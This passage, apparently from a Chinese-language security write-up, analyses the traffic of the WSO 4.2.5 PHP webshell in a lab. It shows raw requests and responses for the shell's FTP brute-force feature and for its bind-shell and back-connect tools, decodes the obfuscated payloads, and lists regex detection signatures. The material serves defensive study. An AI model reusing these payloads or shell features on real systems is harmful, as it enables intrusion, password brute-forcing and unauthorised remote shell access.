IP:</span><br>192.168.182.1</nobr></td></tr></table><table style="background-color:#2E6E9C;" cellpadding=3 cellspacing=0 width=100%><tr><th>[ <a href="#" onclick="g('SecInfo',null,'','','')">Sec. Info</a> ]</th><th>[ <a href="#" onclick="g('FilesMan',null,'','','')">Files</a> ]</th><th>[ <a href="#" onclick="g('Console',null,'','','')">Console</a> ]</th><th>[ <a href="#" onclick="g('Infect',null,'','','')">Infect</a> ]</th><th>[ <a href="#" onclick="g('Sql',null,'','','')">Sql</a> ]</th><th>[ <a href="#" onclick="g('Php',null,'','','')">Php</a> ]</th><th>[ <a href="#" onclick="g('SafeMode',null,'','','')">Safe mode</a> ]</th><th>[ <a href="#" onclick="g('StringTools',null,'','','')">String tools</a> ]</th><th>[ <a href="#" onclick="g('Bruteforce',null,'','','')">Bruteforce</a> ]</th><th>[ <a href="#" onclick="g('Network',null,'','','')">Network</a> ]</th><th>[ <a href="#" onclick="g('Logout',null,'','','')">Logout</a> ]</th><th>[ <a href="#" onclick="g('SelfRemove',null,'','','')">Self remove</a> ]</th></tr></table><div><h1>Results</h1><div class=content><span>Type:</span> ftp <span>Server:</span> 127.0.0.1<br><span>Attempts:</span> 74 <span>Success:</span> 0</div><br><h1>FTP bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td><td><label><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></label></td></tr><tr><td><input type=hidden name=c value="/var/www/html/webshell-master/php/wso/"><input type=hidden name=a value="Bruteforce"><input type=hidden name=charset value="UTF-8"><input type=hidden name=ne  value=""><span>Server:port</span></td><td><input type=text name=server value="127.0.0.1"></td></tr><tr><td><span>Brute type</span></td><td><input type=radio name=type value="1" checked> /etc/passwd</td></tr><tr><td></td><td style="padding-left:15px"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</td></tr><tr><td></td><td><input type=radio name=type value="2"> Dictionary</td></tr><tr><td></td><td><table style="padding-left:15px"><tr><td><span>Login</span></td><td><input type=text name=login value="root"></td></tr><tr><td><span>Dictionary</span></td><td><input type=text name=dict value="/var/www/html/webshell-master/php/wso/passwd.dic"></td></tr></table></td></tr><tr><td></td><td><input type=submit value="submit"></td></tr></form></table></div>
	</div>
	<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
		<tr>
			<td><form onsubmit="g(null,this.c.value,'');return false;"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='/var/www/html/webshell-master/php/wso/'><input type=submit value='submit'></form></td>
			<td><form onsubmit="g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
		</tr><tr>
			<td><form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"><span>Make dir:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=text name=d required><input type=submit value='submit'></form></td>
			<td><form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
		</tr><tr>
			<td><form onsubmit="g('Console',null,this.c.value);return false;"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='submit'></form></td>
			<td><form method='post' ENCTYPE='multipart/form-data'>
			<input type=hidden name=a value='FilesMan'>
			<input type=hidden name=c value='/var/www/html/webshell-master/php/wso/'>
			<input type=hidden name=p1 value='uploadFile'>
			<input type=hidden name=ne value=''>
			<input type=hidden name=charset value='UTF-8'>
			<span>Upload file:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td>
		</tr></table></div>
		<!-- particles --> <div id='particles-js'></div><script src='http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script>
		<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'value':'#ffffff'},'shape':{'type':'triangle','stroke':{'width':0,'color':'#000000'},'polygon':{'nb_sides':5},'image':{'src':'img/github.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sync':false}},'size':{'value':3,'random':true,'anim':{'enable':false,'speed':40,'size_min':0.1,'sync':false}},'line_linked':{'enable':true,'distance':200,'color':'#ffffff','opacity':0.4,'width':1},'move':{'enable':true,'speed':1,'direction':'none','random':true,'straight':false,'out_mode':'out','bounce':false,'attract':{'enable':false,'rotateX':10000,'rotateY':10000}}},'interactivity':{'detect_on':'canvas','events':{'onhover':{'enable':true,'mode':'grab'},'onclick':{'enable':true,'mode':'repulse'},'resize':true},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':true});</script>
		</body></html>

#### 4.9.2&emsp;数据包分析 ####
>请求数据包攻击载荷：<font color=red>proto=ftp&c=%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2F&a=Bruteforce&charset=UTF-8&ne=&server=127.0.0.1&type=1&reverse=1&login=root&dict=%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2Fpasswd.dic</font>

>数据包载荷分析：该载荷经过url编码，通过url解码后的载荷为：proto=ftp&c=/var/www/html/webshell-master/php/wso/&a=Bruteforce&charset=UTF-8&ne=&server=127.0.0.1&type=1&reverse=1&login=root&dict=/var/www/html/webshell-master/php/wso/passwd.dic 

>响应数据包分析：该操作没有通过ajax的方式进行提交，所以返回时刷新整个页面，返回的数据也是整个页面。

>具体信息如图4.9.1所示：<br>![wso_shell]({{ site.baseurl }}/images/wso_shell/bruteforce.png)<br><center>图4.9.1</center>

### 4.10&emsp;反弹shell ###
#### 4.10.1&emsp;数据包内容 ####
**请求数据包**
<br>

	POST /webshell-master/php/wso/wso-4.2.5.php HTTP/1.1
	Host: 192.168.182.143
	Connection: keep-alive
	Content-Length: 165
	Cache-Control: max-age=0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	Origin: http://192.168.182.143
	Upgrade-Insecure-Requests: 1
	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
	Content-Type: application/x-www-form-urlencoded
	Referer: http://192.168.182.143/webshell-master/php/wso/wso-4.2.5.php
	Accept-Encoding: gzip, deflate
	Accept-Language: zh-CN,zh;q=0.8
	Cookie: da94407ecf64bda7c0ac6ea1fa4477d8key=d69aa478a72ecd3a99c77af6fcf6b917; da94407ecf64bda7c0ac6ea1fa4477d8=21232f297a57a5a743894a0e4a801fc3
	
	a=DikPBT1lfEkvDVVV&c=FncDXTo%2BfAMqSQseLzIYGDtxaEkDAyFPOD01QDsUaEYDNQBdFDUAQy4TC0oWdz1POy59DQ%3D%3D&p1=AyobXw%3D%3D&p2=Fz4cTxQtJg0%3D&p3=FxAQTxcTEAI%3D&charset=UTF-8

**响应数据包**
<br>

	HTTP/1.1 200 OK
	Date: Tue, 08 Nov 2016 01:15:45 GMT
	Server: Apache/2.4.7 (Ubuntu)
	X-Powered-By: PHP/5.5.9-1ubuntu4.19
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 4604
	Keep-Alive: timeout=5, max=100
	Connection: Keep-Alive
	Content-Type: text/html
	
	<html><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'><title>192.168.182.143 - WSO 4.2.5</title>
	<style>
		body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
		#particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}
		body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
		table.info	{color:#C3C3C3;}
		table#toolsTbl {background-color: #060A10;}
		span,h1,a	{color:#fff !important;}
		span		{font-weight:bolder;}
		h1			{border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}
		div.content	{padding:5px;margin-left:5px;background-color:#060a10;}
		a			{text-decoration:none;}
		a:hover		{text-decoration:underline;}
		.tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
		.tooltip:hover::after {opacity:1;visibility:visible;}
		.ml1		{border:1px solid #202832;padding:5px;margin:0;overflow:auto;}
		.bigarea	{min-width:100%;max-width:100%;height:400px;}
		input, textarea, select	{margin:0;color:#fff;background-color:#202832;border:none;font:9pt Courier New;outline:none;}
		label {position:relative}
		label:after {content:'<>';font:10px 'Consolas', monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;}
		label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;}
		form		{margin:0px;}
		#toolsTbl	{text-align:center;}
		#fak 		{background:none;}
		#fak td 	{padding:5px 0 0 0;}
		iframe		{border:1px solid #060a10;}
		.toolsInp	{width:300px}
		.main th	{text-align:left;background-color:#060a10;}
		.main tr:hover{background-color:#354252;}
		.main td, th{vertical-align:middle;}
		input[type='submit']{background-color:#2E6E9C;}
		input[type='button']{background-color:#2E6E9C;}
		input[type='submit']:hover{background-color:#56AD15;}
		input[type='button']:hover{background-color:#56AD15;}
		.l1			{background-color:#202832;}
		pre			{font:9pt Courier New;}
	</style>
	<script>
	    var c_ = '/var/www/html/webshell-master/php/wso/';
	    var a_ = 'Network'
	    var charset_ = 'UTF-8';
	    var p1_ = 'bpc';
	    var p2_ = '31337';
	    var p3_ = '123456';
	    var d = document;
		
		function encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);}
		function utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;}
		function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}
		function set(a,c,p1,p2,p3,charset) {
			if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
			if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
			if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
			if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
			if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
			d.mf.a.value = encrypt(d.mf.a.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.c.value = encrypt(d.mf.c.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p1.value = encrypt(d.mf.p1.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p2.value = encrypt(d.mf.p2.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			d.mf.p3.value = encrypt(d.mf.p3.value,'d69aa478a72ecd3a99c77af6fcf6b917');
			if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
		}
		function g(a,c,p1,p2,p3,charset) {
			set(a,c,p1,p2,p3,charset);
			d.mf.submit();
		}
		function a(a,c,p1,p2,p3,charset) {
			set(a,c,p1,p2,p3,charset);
			var params = 'ajax=true';
			for(i=0;i<d.mf.elements.length;i++)
				params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
			sr('/webshell-master/php/wso/wso-4.2.5.php', params);
		}
		function sr(url, params) {
			if (window.XMLHttpRequest)
				req = new XMLHttpRequest();
			else if (window.ActiveXObject)
				req = new ActiveXObject('Microsoft.XMLHTTP');
	        if (req) {
	            req.onreadystatechange = processReqChange;
	            req.open('POST', url, true);
	            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
	            req.send(params);
	        }
		}
		function processReqChange() {
			if( (req.readyState == 4) )
				if(req.status == 200) {
					var reg = new RegExp("(\\d+)([\\S\\s]*)", 'm');
					var arr=reg.exec(req.responseText);
					eval(arr[2].substr(0, arr[1]));
				} else alert('Request error!');
		}
	</script>
	<head><body><div style='position:absolute;background-color:rgba(95, 110, 130, 0.3);width:100%;top:0;left:0;'>
	<form method=post name=mf style='display:none;'>
	<input type=hidden name=a>
	<input type=hidden name=c>
	<input type=hidden name=p1>
	<input type=hidden name=p2>
	<input type=hidden name=p3>
	<input type=hidden name=charset>
	</form><table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:</span></td><td><nobr>Linux ubuntu 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64 <a href="http://noreferer.de/?http://www.google.com/search?q=Linux+ubuntu+3.19.0-25-generic+%2326%7E14.04.1-Ubuntu+SMP+Fri+Jul+24+21%3A16%3A20+UTC+2015+x86_64" target="_blank">[ Google ]</a> <a href="http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=Linux+Kernel+3.19.0" target=_blank>[ Exploit-DB ]</a></nobr><br>33 ( www-data ) <span>Group:</span> 33 ( www-data )<br>5.5.9-1ubuntu4.19 <span>Safe mode:</span> <font color=#FFDB5F><b>OFF</b></font> <a href=# onclick="g('Php',null,null,'info')">[ phpinfo ]</a> <span>Datetime:</span> 2016-11-08 09:15:45<br>18.58 GB <span>Free:</span> 13.12 GB (70.62%)<br><a href='#' onclick='g("FilesMan","/")'>/</a><a href='#' onclick='g("FilesMan","/var/")'>var/</a><a href='#' onclick='g("FilesMan","/var/www/")'>www/</a><a href='#' onclick='g("FilesMan","/var/www/html/")'>html/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/")'>webshell-master/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/php/")'>php/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/php/wso/")'>wso/</a> <font color=#FFDB5F><b>drwxrwxrwx</b></font> <a href=# onclick="g('FilesMan','/var/www/html/webshell-master/php/wso','','','')">[ home ]</a><br></td><td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)"><option value="UTF-8" selected>UTF-8</option><option value="Windows-1251" >Windows-1251</option><option value="KOI8-R" >KOI8-R</option><option value="KOI8-U" >KOI8-U</option><option value="cp866" >cp866</option></select></label><br><span>Server IP:</span><br>192.168.182.143<br><span>Client IP:</span><br>192.168.182.1</nobr></td></tr></table><table style="background-color:#2E6E9C;" cellpadding=3 cellspacing=0 width=100%><tr><th>[ <a href="#" onclick="g('SecInfo',null,'','','')">Sec. Info</a> ]</th><th>[ <a href="#" onclick="g('FilesMan',null,'','','')">Files</a> ]</th><th>[ <a href="#" onclick="g('Console',null,'','','')">Console</a> ]</th><th>[ <a href="#" onclick="g('Infect',null,'','','')">Infect</a> ]</th><th>[ <a href="#" onclick="g('Sql',null,'','','')">Sql</a> ]</th><th>[ <a href="#" onclick="g('Php',null,'','','')">Php</a> ]</th><th>[ <a href="#" onclick="g('SafeMode',null,'','','')">Safe mode</a> ]</th><th>[ <a href="#" onclick="g('StringTools',null,'','','')">String tools</a> ]</th><th>[ <a href="#" onclick="g('Bruteforce',null,'','','')">Bruteforce</a> ]</th><th>[ <a href="#" onclick="g('Network',null,'','','')">Network</a> ]</th><th>[ <a href="#" onclick="g('Logout',null,'','','')">Logout</a> ]</th><th>[ <a href="#" onclick="g('SelfRemove',null,'','','')">Self remove</a> ]</th></tr></table><div><h1>Network tools</h1><div class=content>
		<form name='nfp' onSubmit='g(null,null,this.using.value,this.port.value,this.pass.value);return false;'>
		<span>Bind port to /bin/sh</span><br/>
		Port: <input type='text' name='port' value='31337'> Password: <input type='text' name='pass'> Using: <label><select name='using'><option value='bpc'>C</option><option value='bpp'>Perl</option></select></label> <input type=submit value='submit'>
		</form>
		<form name='nfp' onSubmit='g(null,null,this.using.value,this.server.value,this.port.value);return false;'>
		<span>Back-connect to</span><br/>
		Server: <input type='text' name='server' value=192.168.182.1> Port: <input type='text' name='port' value='31337'> Using: <label><select name='using'><option value='bcc'>C</option><option value='bcp'>Perl</option></select></label> <input type=submit value='submit'>
		</form><br><pre class=ml1> Query did not return anything
	 Query did not return anything
	www-data   2967  0.0  0.0   4196    84 ?        Ss   09:15   0:00 /tmp/bp 31337 123456
	www-data   2968  0.0  0.0   4448   784 ?        S    09:15   0:00 sh -c ps aux | grep bp
	www-data   2970  0.0  0.0   8872   944 ?        S    09:15   0:00 grep bp</pre></div>
	</div>
	<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
		<tr>
			<td><form onsubmit="g(null,this.c.value,'');return false;"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='/var/www/html/webshell-master/php/wso/'><input type=submit value='submit'></form></td>
			<td><form onsubmit="g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
		</tr><tr>
			<td><form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"><span>Make dir:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=text name=d required><input type=submit value='submit'></form></td>
			<td><form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
		</tr><tr>
			<td><form onsubmit="g('Console',null,this.c.value);return false;"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='submit'></form></td>
			<td><form method='post' ENCTYPE='multipart/form-data'>
			<input type=hidden name=a value='FilesMan'>
			<input type=hidden name=c value='/var/www/html/webshell-master/php/wso/'>
			<input type=hidden name=p1 value='uploadFile'>
			<input type=hidden name=ne value=''>
			<input type=hidden name=charset value='UTF-8'>
			<span>Upload file:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td>
		</tr></table></div>
		<!-- particles --> <div id='particles-js'></div><script src='http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script>
		<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'value':'#ffffff'},'shape':{'type':'triangle','stroke':{'width':0,'color':'#000000'},'polygon':{'nb_sides':5},'image':{'src':'img/github.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sync':false}},'size':{'value':3,'random':true,'anim':{'enable':false,'speed':40,'size_min':0.1,'sync':false}},'line_linked':{'enable':true,'distance':200,'color':'#ffffff','opacity':0.4,'width':1},'move':{'enable':true,'speed':1,'direction':'none','random':true,'straight':false,'out_mode':'out','bounce':false,'attract':{'enable':false,'rotateX':10000,'rotateY':10000}}},'interactivity':{'detect_on':'canvas','events':{'onhover':{'enable':true,'mode':'grab'},'onclick':{'enable':true,'mode':'repulse'},'resize':true},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':true});</script>
		</body></html>

#### 4.10.2&emsp;数据包分析 ####
>请求数据包攻击载荷：<font color=red>a=DikPBT1lfEkvDVVV&c=FncDXTo%2BfAMqSQseLzIYGDtxaEkDAyFPOD01QDsUaEYDNQBdFDUAQy4TC0oWdz1POy59DQ%3D%3D&p1=AyobXw%3D%3D&p2=Fz4cTxQtJg0%3D&p3=FxAQTxcTEAI%3D&charset=UTF-8</font>

>数据包载荷分析：通过解密函数对攻击载荷进行解密，解密后的payload为： a=Network&c=/var/www/html/webshell-master/php/wso/&p1=bpc&p2=31337&p3=123456&charset=UTF-8，该操作为绑定端口31337和密码123456

>响应数据包分析：该操作没有通过ajax的方式进行提交，所以返回时刷新整个页面，返回的数据也是整个页面。

>具体信息如图4.10.1所示：<br>![wso_shell]({{ site.baseurl }}/images/wso_shell/Network.png)<br><center>图4.10.1</center>

## 5.&emsp;特征集 ##
### 5.1&emsp;前台过滤特征集 ###
|正则表达式|说明|
|---|---|
|?HTTP/[\S\s]+?[\s\S]a=Sql&p1=.\*?&p2=.\*?&c=.\*?&charset=|数据库操作|
|?HTTP/[\S\s]+?[\s\S]a=.\*?&c=.\*?&p1=.\*?&p2=.\*?&charset=|普通数据操作|
|?HTTP/[\S\s]+?[\S\s]ajax=true&a=.\*?&c=.\*?&p1=.\*?&p2=.\*?&charset=|使用ajax提交数据操作|
|?HTTP/[\S\s]+?[\s\S]a=.\*?&c=.\*?&charset=.\*?&p1=|删除文件操作|
|?HTTP/[\S\s]+?[\s\S]name="a"[\s\S]\*?name="c"[\s\S]\*?name="p1"[\s\S]\*?name="charset"|上传文件操作|
|?HTTP/[\S\s]+?[\s\S]proto=.\*?&c=.\*?&a=.\*?&charset=|暴力破解操作|
